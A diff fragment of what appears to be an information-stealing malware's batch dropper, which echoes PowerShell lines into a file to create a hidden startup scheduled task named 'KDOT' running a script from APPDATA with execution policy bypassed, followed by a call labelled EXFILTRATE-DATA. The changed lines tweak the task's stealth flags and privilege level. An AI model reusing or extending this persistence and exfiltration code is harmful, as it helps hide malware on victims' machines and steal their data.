@@ -183,8 +183,8 @@ echo if ($test -contains "KDOT") { >> powershell123.ps1
 echo Write-Host "KDOT already exists" >> powershell123.ps1
 echo } else { >> powershell123.ps1
 echo $schedule = New-ScheduledTaskTrigger -AtStartup >> powershell123.ps1
-echo $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
-echo Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force >> powershell123.ps1
+echo $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
+echo Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Limited -Force >> powershell123.ps1
 echo } >> powershell123.ps1
 echo EXFILTRATE-DATA >> powershell123.ps1
 echo } >> powershell123.ps1
